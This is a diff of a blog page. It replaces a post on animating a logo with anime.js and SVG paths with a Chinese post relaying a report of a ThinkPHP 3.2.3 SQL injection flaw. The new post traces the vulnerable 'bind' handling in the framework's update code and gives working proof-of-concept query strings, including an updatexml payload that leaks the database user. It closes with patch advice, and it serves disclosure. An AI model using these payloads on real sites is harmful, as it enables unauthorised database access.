@@ -19,11 +19,11 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>anime.js实现logo动画 - hojunBlog</title>
+<title>thinkphp3.2.3发现sql注入漏洞！ - hojunBlog</title>
 
-<meta name="keywords" content="anime.js">
+<meta name="keywords" content="SQL注入漏洞">
 
-<meta name="description " content="实现自己的logo动画~">
+<meta name="description " content="安全客文章报道发现Thinkphp3.2.3最新版SQL注入漏洞！还使用Thinkphp3.2.3版本的小伙伴赶紧去github上更新补丁">
 <meta name="baidu-site-verification" content="0hxFvBRyRY" />
 </head>
 <body>
@@ -149,46 +149,29 @@
                 </a>
                 <p><span class="label">作者</span>
                     <a href="null" target="_blank">hojun</a>
-                    <span title="最后编辑于2018-03-14">2018-03-14</span>
+                    <span title="最后编辑于2018-04-16">2018-04-16</span>
                 </p>
                 <p>一个好奇的人</p>
             </div>
-            <h2 class="post-title">anime.js实现logo动画</h2>
+            <h2 class="post-title">Thinkphp3.2.3发现SQL注入漏洞！</h2>
             <div class="post-meta">
-                本文总共1765个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共2106个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
-            
-<link rel="stylesheet" href="/css/hojunlogo.css" />
-<div id="logoAmine">
-  <canvas class="fireworks"></canvas>
-  <section id="lineDrawing">
-    <svg class="logo" width="25rem" height="25rem" viewBox="0 0 800 384">
-      <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
-        <rect id="dot-js" fill="#000000" x="80" y="352" width="32" height="32" rx="16"></rect>
-        <g id="lines" transform="translate(128.000000, 256.000000)">
-          <path d="M16,-70 L16,128 L16,64 C16,37.490332 37.490332,16 68,16 C90.509668,16 112,37.490332 112,64 L112,128" stroke="#e72a0f" stroke-width="32"></path>
-          <path d="M192,112 C165.490332,112 144,90.509668 144,64 C144,37.490332 165.490332,16 192,16 C218.509668,16 240,37.490332 240,64 C240,90.509668 218.509668,112 192,112"  stroke="#feee00" stroke-width="32"></path>
-          <path d="M272,0 L272,228 C252,248 232,228 230,218" stroke="#0097dc" stroke-width="32"></path>
-          <path d="M304,0 L304,64 C304,90.509668 325.490332,112 352,112 C378.509668,112 400,90.509668 400,64 L400,0" stroke="#4cd137" stroke-width="32"></path>
-          <path d="M433,128 L433,64 C433,37.490332 454.490332,16 481,16 C507.509668,16 529,37.490332 529,64 L529,128" stroke="#9f559d" stroke-width="32" stroke-dasharray="150"d></path>
-        </g>
-      </g>
-    </svg>
-  </section>
-</div>
-<script type="text/javascript" src="/js/anime.min.js"></script>
-<script type="text/javascript" src="/js/hojunlogo.js"></script>
-
-<p>之前无聊浏览特效的时候，发现了anime.js的logo动画特效，于是也想整个自己的logo动画。<br>着手coding的时候，发现没那么简单(｡•ˇ‸ˇ•｡)</p>
-<h2 id="第一个难点-SVG"><a href="#第一个难点-SVG" class="headerlink" title="第一个难点 SVG"></a><strong>第一个难点 SVG</strong></h2><p>之前接触到的SVG一直都是“不失真的矢量图”这么一个概念，但是这次的特效需要用到svg的<code>&lt;path&gt;</code>标签</p>
-<p>w3c介绍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;path&gt; 标签用来定义路径。</span><br><span class="line">下面的命令可用于路径数据：</span><br><span class="line">    M = moveto</span><br><span class="line">    L = lineto</span><br><span class="line">    H = horizontal lineto</span><br><span class="line">    V = vertical lineto</span><br><span class="line">    C = curveto</span><br><span class="line">    S = smooth curveto</span><br><span class="line">    Q = quadratic Belzier curve</span><br><span class="line">    T = smooth quadratic Belzier curveto</span><br><span class="line">    A = elliptical Arc</span><br><span class="line">    Z = closepath</span><br><span class="line">注释：以上所有命令均允许小写字母。大写表示绝对定位，小写表示相对定位。</span><br><span class="line"></span><br><span class="line">请把下面的代码拷贝到记事本，然后把文件保存为 &quot;path1.svg&quot;。把此文件放入您的 web 目录：</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; </span><br><span class="line">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg width=&quot;100%&quot; height=&quot;100%&quot; version=&quot;1.1&quot;</span><br><span class="line">xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;path d=&quot;M250 150 L150 350 L350 350 Z&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">上面的例子定义了一条路径，它开始于位置 250 150，到达位置 150 350，然后从那里开始到 350 350，最后在 250 150 关闭路径。</span><br></pre></td></tr></table></figure></p>
-<p>通过以上介绍能够稍微理解path作用，了解更多请浏览作者的另一篇文章<a href="http://www.hojun.cn/2018/03/15/SVG深入浅出">SVG深入浅出</a></p>
-<h2 id="第二个难点-贝赛尔曲线"><a href="#第二个难点-贝赛尔曲线" class="headerlink" title="第二个难点 贝赛尔曲线"></a><strong>第二个难点 贝赛尔曲线</strong></h2><p>在我了解了SVG的大致原理后，自以为已经接近成功的大门。于是用ps做了一幅png格式的logo图片<br><img class="lozad" data-src="https://wx4.sinaimg.cn/large/006bYVyvgy1fpct76iedsj30dw06wmx4.jpg" alt=""><br>接着把png转svg格式图片，<a href="http://www.pngtosvg.com/">在线转换工具</a><br>最后把SVG的path数据插入代码。Σ(っ °Д °;)っ发现并不是自己想要的效果。<br>通过阅读官方文档和特效代码发现anime.js的动画是根据路径来呈现的，所以我应该提供的SVG的<code>&lt;path&gt;</code>只是一条线段就够了。</p>
+            <p><img class="lozad" data-src="https://wx2.sinaimg.cn/large/006bYVyvgy1fqeqiwzno1j30au0643yf.jpg" alt=""><br>安全客文章报道发现Thinkphp3.2.3最新版SQL注入漏洞！还使用Thinkphp3.2.3版本的小伙伴赶紧去github上更新补丁！</p>
 <hr>
-<p>又回到起点，从新开始使用<code>&lt;path&gt;</code>提供的命令画logo。<br>第一个h，好办的，只要把n的左边那条直线的Y坐标改长点就行。<br>第二个o,没有现成的o，只能在a上面动手脚，可是<code>&lt;path&gt;</code>的C命令就是三次贝塞尔曲线。表示不太会画，肿么办(<em>/ω＼</em>)?<br>上网找资料呗~ 找到张鑫旭大牛的一片文章<a href="http://www.zhangxinxu.com/wordpress/2014/06/deep-understand-svg-path-bezier-curves-command/">深度掌握SVG路径path的贝塞尔曲线指令</a>还有dayu提供的<a href="http://dayu.pw/svgcontrol/">任意二次、三次贝塞尔曲线呈现工具</a><br><img class="lozad" data-src="https://wx1.sinaimg.cn/large/006bYVyvgy1fpct2bximcj30jh0b5jrf.jpg" alt=""><br>已知a的三条弧线<br><img class="lozad" data-src="https://wx4.sinaimg.cn/large/006bYVyvgy1fpct26viiaj305r05udft.jpg" alt="">即需要求红框里的两个点。需要求甚解的童鞋请参照这篇文章<a href="http://www.cnblogs.com/ArthurQQ/articles/1730214.html">使用贝塞尔曲线拟合圆</a><br>不需要的童鞋可以发挥一下自带的我看看看看看出来，上图已经很明显了，o即圆形是上下左右对称的，通过对称的特性就可以得到那两个点的坐标。<br>第三个j,自由发挥了o(<em>￣︶￣</em>)o<br>第四个u,参考n把它给倒过来(⌒▽⌒)<br>第五个n,现成的有，大功告成ヾ(^▽^*)))</p>
-<p><a href="http://www.hojun.cn/2018/03/14/anime-js实现logo动画/">效果预览</a><br>感谢<a href="http://animejs.com">anime.js</a>以及<a href="http://www.5iweb.com.cn/resource/5iweb2017070301/index.html">51web</a>提供的特效代码</p>
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a><strong>漏洞详情</strong></h2><p>由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入。</p>
+<p>thinkphp系列框架过滤表达式注入多半采用I函数去调用think_filter<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span><span class="params">(&amp;$value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))</span><br></pre></td></tr></table></figure></p>
+<p>有没有相关tips来达到I函数绕过呢？是可以的。<br>一般按照官方的写法，thinkphp提供了数据库链式操作，其中包含连贯操作和curd操作，在进行数据库CURD操作去更新数据的时候：<br>举例update数据操作。<br><img class="lozad" data-src="https://wx1.sinaimg.cn/large/006bYVyvgy1fqeqbe8b70j30jm0c4mz4.jpg" alt=""><br>直接看框架的where子单元函数，之前网上公开的exp表达式注入就是从这里分析出来的结论:<br>Thinkphp/Library/Think/Db/Driver.class.php<br>其中除了exp能利用外还有一处bind，而bind可以完美避开了think_filter：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="string">'bind'</span> == $exp )&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">    $whereStr .= $key.<span class="string">' = :'</span>.$val[<span class="number">1</span>];</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="string">'exp'</span> == $exp )&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">    $whereStr .= $key.<span class="string">' '</span>.$val[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>
+<p>这里由于拼接了<code>$val</code>参数的形式造成了注入，但是这里的bind表达式会引入:符号参数绑定的形式去拼接数据，通过白盒对几处CURD操作函数进行分析定位到update函数，insert函数会造成sql注入，于是回到上面的updateh函数。<br>Thinkphp/Library/Think/Db/Driver.class.php<br>接着跟进execute函数，这里有处对$this-&gt;queryStr进行字符替换的操作：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;queryStr =   strtr(<span class="keyword">$this</span>-&gt;queryStr,array_map(<span class="function"><span class="keyword">function</span><span class="params">($val)</span> <span class="title">use</span><span class="params">($that)</span></span>&#123; <span class="keyword">return</span> <span class="string">''</span><span class="string">'.$that-&gt;escapeString($val).'</span><span class="string">''</span>; &#125;,<span class="keyword">$this</span>-&gt;bind));</span><br></pre></td></tr></table></figure>
+<p>具体是什么，我这里写了一个实例：<br>常规的跟新数据库用户信息的操作：<br>Application/Home/Controller/UserController.class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">HomeController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">ThinkController</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $User = M(<span class="string">"member"</span>);</span><br><span class="line">        $user[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">        $data[<span class="string">'money'</span>] = I(<span class="string">'money'</span>);</span><br><span class="line">        $data[<span class="string">'user'</span>] = I(<span class="string">'user'</span>);</span><br><span class="line">        $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">        var_dump($valu);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>根据进来的id更新用户的名字和钱，构造一个简单一个poc<br>id[]=bind&amp;id[]=1’&amp;money[]=1123&amp;user=liao<br>当走到execute函数时sql语句为：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="string">`member`</span> <span class="keyword">SET</span> <span class="string">`user`</span>=:<span class="number">0</span> <span class="keyword">WHERE</span> <span class="string">`id`</span> = :<span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
+<p>然后<code>$that = $this</code><br><img class="lozad" data-src="https://wx3.sinaimg.cn/large/006bYVyvgy1fqeqb93u9aj30f203cmxk.jpg" alt=""><br>然后下面的替换操作是将”:0”替换为外部传进来的字符串，这里就可控了。<br><img class="lozad" data-src="https://wx3.sinaimg.cn/large/006bYVyvgy1fqeqb43ayyj30hs016mx5.jpg" alt=""><br>替换后：<br><img class="lozad" data-src="https://wx3.sinaimg.cn/large/006bYVyvgy1fqeqbjj36jj30ea03bwew.jpg" alt=""><br>明显发现之前的user参数为:0然后被替换为了liao，这样就把:替换掉了。<br>后面的:1明显是替换不掉的：<br><img class="lozad" data-src="https://wx1.sinaimg.cn/large/006bYVyvgy1fqeqims50kj30xk07nmyj.jpg" alt=""><br>那么我们将id[1]数组的参数变为0呢？<br>id[]=bind&amp;id[]=0%27&amp;money[]=1123&amp;user=liao<br><img class="lozad" data-src="https://wx1.sinaimg.cn/large/006bYVyvgy1fqeqirsj4qj312y08bwgd.jpg" alt=""><br>果然造成了注入：<br>POC:<br>money[]=1123&amp;user=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))<br><img class="lozad" data-src="https://wx1.sinaimg.cn/large/006bYVyvgy1fqeqj21mpsj311h06kq4e.jpg" alt=""></p>
+<hr>
+<h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a><strong>修复方式</strong></h2><p>更新最新补丁<br><a href="https://github.com/top-think/thinkphp/">https://github.com/top-think/thinkphp/</a><br><a href="https://www.anquanke.com/post/id/104847">原文地址</a><a href="http://www.anquanke.com/post/id/104847">www.anquanke.com/post/id/104847</a></p>
 
         </div>
         <div style="text-align:center" class="share-component social-share" data-disabled="facebook, twitter, google"></div>
@@ -200,9 +183,9 @@
         
         <div class="post-tags">标签：
             
-            <a href="/tags/前端/">前端</a>
+            <a href="/tags/php/">php</a>
             
-            <a href="/tags/js/">js</a>
+            <a href="/tags/thinkphp/">thinkphp</a>
             
         </div>
         
@@ -211,7 +194,7 @@
     <div id="article-toc-inner">
         <strong class="sidebar-title">
         目录</strong>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一个难点-SVG"><span class="toc-text">第一个难点 SVG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二个难点-贝赛尔曲线"><span class="toc-text">第二个难点 贝赛尔曲线</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞详情"><span class="toc-text">漏洞详情</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复方式"><span class="toc-text">修复方式</span></a></li></ol>
     </div>
 </aside>
     
